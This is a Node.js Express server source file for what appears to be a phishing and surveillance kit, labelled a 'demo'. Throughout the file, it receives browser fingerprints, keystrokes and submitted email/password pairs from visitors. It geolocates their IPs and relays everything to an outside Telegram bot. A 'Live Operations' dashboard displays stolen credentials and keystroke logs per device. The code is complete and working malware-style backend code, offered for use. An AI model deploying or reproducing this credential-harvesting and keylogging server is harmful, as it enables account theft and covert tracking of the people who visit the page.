const express = require("express");
const path = require("path");
const http = require("http");
const https = require("https");
const crypto = require("crypto");
const fs = require("fs");

// ── Config: env vars first, then config.json ──────────────────────────
let CONFIG = {};
try {
  CONFIG = JSON.parse(fs.readFileSync(path.join(__dirname, "config.json"), "utf8"));
} catch (e) { /* config.json optional */ }

const BOT_TOKEN = process.env.BOT_TOKEN || CONFIG.bot_token;
const CHAT_ID = process.env.CHAT_ID || CONFIG.chat_id;
const ADMIN_KEY = process.env.ADMIN_KEY || CONFIG.admin_key || "changeme";
const PORT = process.env.PORT || 3000;

if (!BOT_TOKEN || !CHAT_ID) {
  console.error("\n[!] Missing Telegram config.");
  console.error("    Create config.json in this folder:");
  console.error('    { "bot_token": "123456:ABC...", "chat_id": "987654321" }\n');
  process.exit(1);
}

const app = express();
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

// ── Session registry: one entry per unique device ─────────────────────
const sessions = new Map();

function sessionFor(req) {
  const ip = clientIp(req);
  const ua = req.headers["user-agent"] || "unknown";
  const sid = crypto.createHash("sha256").update(ip + "|" + ua).digest("hex").slice(0, 12);

  if (!sessions.has(sid)) {
    sessions.set(sid, {
      sid, ip, ua,
      device: {}, location: null,
      keys: [], creds: null,
      visits: 0,
      firstSeen: Date.now(), lastSeen: Date.now(),
    });
  }
  const s = sessions.get(sid);
  s.lastSeen = Date.now();
  return s;
}

// ── Telegram relay ─────────────────────────────────────────────────────
function tgSend(html) {
  const payload = JSON.stringify({ chat_id: CHAT_ID, text: html, parse_mode: "HTML" });

  const req = https.request(
    { hostname: "api.telegram.org", path: `/bot${BOT_TOKEN}/sendMessage`, method: "POST",
      headers: { "Content-Type": "application/json" } },
    (res) => {
      let body = "";
      res.on("data", (c) => (body += c));
      res.on("end", () => { if (res.statusCode !== 200) console.error(`[tg] ${res.statusCode}: ${body}`); });
    }
  );
  req.on("error", (e) => console.error("[tg] send failed:", e.message));
  req.write(payload);
  req.end();
}

// ── Helpers ────────────────────────────────────────────────────────────
function clientIp(req) {
  const fwd = req.headers["x-forwarded-for"];
  if (fwd) return fwd.split(",")[0].trim();
  return req.socket.remoteAddress || "unknown";
}

function isPrivateIp(ip) {
  return (
    ip === "unknown" ||
    ip.startsWith("127.") || ip.startsWith("10.") || ip.startsWith("192.168.") ||
    ip.startsWith("::1") || ip.startsWith("fc") || ip.startsWith("fd") ||
    /^172\.(1[6-9]|2\d|3[01])\./.test(ip)
  );
}

function geoLookup(ip) {
  if (isPrivateIp(ip)) return Promise.resolve(null);

  return new Promise((resolve) => {
    const req = http.get(
      { hostname: "ip-api.com", path: `/json/${ip}?fields=status,country,regionName,city,isp,timezone`, timeout: 4000 },
      (res) => {
        let body = "";
        res.on("data", (c) => (body += c));
        res.on("end", () => {
          try {
            const d = JSON.parse(body);
            resolve(d.status === "success" ? d : null);
          } catch (e) { resolve(null); }
        });
      }
    );
    req.on("error", () => resolve(null));
    req.on("timeout", () => { req.destroy(); resolve(null); });
  });
}

const esc = (s) => String(s || "?").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");

// ── Endpoint: new visitor dossier ──────────────────────────────────────
app.post("/collect", async (req, res) => {
  const s = sessionFor(req);
  const d = req.body || {};

  s.device = {
    platform: d.platform, browser: d.browser, language: d.language,
    screen: d.screen, darkMode: d.darkMode, localTime: d.localTime,
    timezone: d.timezone, cores: d.cores, memory: d.memory,
    battery: d.battery, connection: d.connection,
    touchSupport: d.touchSupport, maxTouchPoints: d.maxTouchPoints,
    gpu: d.gpu, webglHash: d.webglHash, audioFingerprint: d.audioFingerprint,
    plugins: d.plugins, referrer: d.referrer, notifications: d.notifications,
  };
  s.visits += 1;

  const geo = await geoLookup(s.ip);
  if (geo) s.location = { city: geo.city, region: geo.regionName, country: geo.country, isp: geo.isp, tz: geo.timezone };
  s.lastGeoUpdate = Date.now();

  const now = new Date().toLocaleTimeString("en-IN", { hour12: false });
  const returning = s.visits > 1 ? " <i>(returning device)</i>" : "";

  let msg = `🎯 <b>NEW VISITOR @ ${esc(now)}</b>${returning}\n`;
  msg += `─────────────────────\n`;
  msg += `📱 <b>Device:</b> ${esc(d.platform)}\n`;
  msg += `🖥️ <b>Browser:</b> ${esc(d.browser)}\n`;
  msg += `🌐 <b>Language:</b> ${esc(d.language)}\n`;
  msg += `🖥️ <b>Screen:</b> ${esc(d.screen)}${d.darkMode ? " (dark mode)" : ""}\n`;
  msg += `⏰ <b>Local time:</b> ${esc(d.localTime)}\n`;

  if (d.battery) msg += `🔋 <b>Battery:</b> ${d.battery.level}%${d.battery.charging ? " (charging)" : " (discharging)"}\n`;
  if (d.connection) msg += `📶 <b>Network:</b> ${esc(d.connection.effectiveType)}${d.connection.saveData ? " (data saver on)" : ""}\n`;
  if (d.cores) msg += `⚙️ <b>CPU cores:</b> ${esc(d.cores)} | RAM: ${esc(d.memory || "?")}GB\n`;
  if (d.timezone) msg += `🕐 <b>Timezone:</b> ${esc(d.timezone)}\n`;
  if (d.touchSupport) msg += `👆 <b>Touch screen:</b> yes (${esc(d.maxTouchPoints)} points)\n`;
  if (d.gpu) msg += `🎮 <b>GPU:</b> ${esc(d.gpu)}\n`;
  if (d.webglHash) msg += `🧬 <b>Device fingerprint hash:</b> <code>${esc(d.webglHash)}</code>\n`;
  if (d.referrer) msg += `↩️ <b>Arrived from:</b> ${esc(d.referrer)}\n`;

  msg += `🌍 <b>IP:</b> <code>${esc(s.ip)}</code>\n`;
  msg += `🆔 <b>Visitor ID:</b> <code>${esc(s.sid)}</code>\n`;

  if (s.location) {
    msg += `📍 <b>Location:</b> ${esc(s.location.city)}, ${esc(s.location.region)} (${esc(s.location.country)})\n`;
    msg += `📡 <b>ISP:</b> ${esc(s.location.isp)}\n`;
  } else if (isPrivateIp(s.ip)) {
    msg += `📍 <b>Location:</b> local network (testing mode)\n`;
  }

  tgSend(msg);
  res.json({ ok: true, sid: s.sid });
});

// ── Endpoint: keystrokes ───────────────────────────────────────────────
app.post("/keys", (req, res) => {
  const s = sessionFor(req);
  const keys = String(req.body.keys || "").slice(0, 2000);
  if (!keys) return res.json({ ok: true });

  const entry = { t: Date.now(), keys, context: req.body.context || "page" };
  s.keys.push(entry);
  if (s.keys.length > 500) s.keys.splice(0, s.keys.length - 500); // cap memory

  const context = entry.context !== "page" ? ` <i>[${esc(entry.context)}]</i>` : "";
  tgSend(`⌨️ <b>KEYSTROKES</b>${context}\n<code>${esc(keys)}</code>`);
  res.json({ ok: true });
});

// ── Endpoint: form submission ──────────────────────────────────────────
app.post("/creds", (req, res) => {
  const s = sessionFor(req);
  const { email, password } = req.body || {};
  if (!email && !password) return res.json({ ok: true });

  s.creds = { email, password, t: Date.now() };

  tgSend(
    `🔐 <b>CREDENTIALS CAPTURED</b>\n` +
    `👤 <b>Email:</b> <code>${esc(email)}</code>\n` +
    `🔑 <b>Password:</b> <code>${esc(password)}</code>`
  );
  res.json({ ok: true });
});

// ── Admin dashboard (live device registry) ────────────────────────────
app.get("/admin/data", (req, res) => {
  if (req.query.key !== ADMIN_KEY) return res.status(403).json({ error: "forbidden" });

  const list = Array.from(sessions.values())
    .sort((a, b) => b.lastSeen - a.lastSeen)
    .map((s) => ({
      sid: s.sid,
      ip: s.ip,
      device: s.device,
      location: s.location,
      visits: s.visits,
      keys: s.keys.slice(-30),
      keyCount: s.keys.length,
      creds: s.creds,
      firstSeen: s.firstSeen,
      lastSeen: s.lastSeen,
      online: Date.now() - s.lastSeen < 30000,
    }));

  res.json({ sessions: list, total: list.length, now: Date.now() });
});

app.get("/admin", (req, res) => {
  res.send(`<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1">
<title>Ops</title>
<style>
  * { margin:0; padding:0; box-sizing:border-box; }
  body { font-family: 'Segoe UI', monospace; background:#0d1117; color:#c9d1d9; padding:16px; }
  h1 { font-size:20px; color:#58a6ff; margin-bottom:4px; }
  .sub { color:#8b949e; font-size:12px; margin-bottom:16px; }
  .device { background:#161b22; border:1px solid #30363d; border-radius:8px; padding:14px; margin-bottom:12px; }
  .online { border-color:#238636; }
  .hdr { display:flex; justify-content:space-between; align-items:center; margin-bottom:8px; flex-wrap:wrap; gap:6px; }
  .dev-name { font-weight:600; color:#f0f6fc; font-size:15px; }
  .badge { font-size:11px; padding:2px 8px; border-radius:10px; }
  .b-on { background:#238636; color:#fff; }
  .b-off { background:#30363d; color:#8b949e; }
  .kv { font-size:13px; line-height:1.7; }
  .kv b { color:#58a6ff; font-weight:500; }
  .keys { background:#0d1117; border-radius:6px; padding:8px; margin-top:8px; font-size:12px; max-height:140px; overflow-y:auto; }
  .keys div { padding:2px 0; border-bottom:1px solid #21262d; }
  .keys .ctx { color:#d29922; }
  .cred { background:#da3633; color:#fff; border-radius:6px; padding:8px; margin-top:8px; font-size:13px; }
  .mono { font-family:Consolas, monospace; }
  .err { color:#f85149; text-align:center; margin-top:40px; }
</style>
</head><body>
<h1>🛰️ Live Operations</h1>
<div class="sub">auto-refresh 3s · <span id="total">0</span> devices seen</div>
<div id="list"><div class="err">waiting for data…</div></div>
<script>
const KEY = new URLSearchParams(location.search).get("key") || "";

function render(d) {
  const el = document.getElementById("list");
  document.getElementById("total").textContent = d.total;
  if (!d.sessions.length) { el.innerHTML = '<div class="err">no devices yet — open the demo link</div>'; return; }
  el.innerHTML = d.sessions.map(s => {
    const dev = s.device || {};
    const loc = s.location ? s.location.city + ", " + s.location.region + " — " + s.location.isp : "unknown";
    const battery = dev.battery ? dev.battery.level + "% " + (dev.battery.charging ? "⚡" : "🔋") : "—";
    const net = dev.connection ? dev.connection.effectiveType.toUpperCase() : "—";
    const keys = (s.keys || []).slice().reverse().map(k =>
      '<div><span class="ctx">[' + k.context + ']</span> <span class="mono">' +
      k.keys.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;") + '</span></div>'
    ).join("") || '<div style="color:#8b949e">no keystrokes yet</div>';
    const cred = s.creds ? '<div class="cred">🔐 ' + s.creds.email + ' / ' + s.creds.password + '</div>' : '';
    return '<div class="device' + (s.online ? ' online' : '') + '">' +
      '<div class="hdr"><span class="dev-name">' + (dev.platform || "Unknown") + '</span>' +
      '<span class="badge ' + (s.online ? 'b-on' : 'b-off') + '">' + (s.online ? 'ONLINE' : 'offline') + '</span></div>' +
      '<div class="kv">' +
      '<b>IP</b> <span class="mono">' + s.ip + '</span> · <b>Net</b> ' + net + ' · <b>Battery</b> ' + battery + '<br>' +
      '<b>Location</b> ' + loc + '<br>' +
      '<b>Browser</b> ' + (dev.browser || "—") + ' · <b>Screen</b> ' + (dev.screen || "—") + '<br>' +
      '<b>First seen</b> ' + new Date(s.firstSeen).toLocaleTimeString() +
      ' · <b>Last seen</b> ' + new Date(s.lastSeen).toLocaleTimeString() +
      ' · <b>Visits</b> ' + s.visits + '</div>' +
      '<div class="keys"><b style="color:#d29922">KEYSTROKES (' + s.keyCount + ')</b>' + keys + '</div>' +
      cred + '</div>';
  }).join("");
}

async function poll() {
  try {
    const r = await fetch("/admin/data?key=" + encodeURIComponent(KEY));
    if (r.status === 403) { document.body.innerHTML = '<div class="err">🔒 wrong admin key — add ?key=YOUR_KEY to the URL</div>'; return; }
    render(await r.json());
  } catch (e) { /* server asleep, retry */ }
}
poll();
setInterval(poll, 3000);
</script>
</body></html>`);
});

app.listen(PORT, () => {
  console.log(`\n[+] Demo server running on port ${PORT}`);
  console.log(`[+] Telegram relaying to chat_id: ${CHAT_ID}`);
  console.log(`[+] Live dashboard: /admin?key=${ADMIN_KEY}\n`);
});
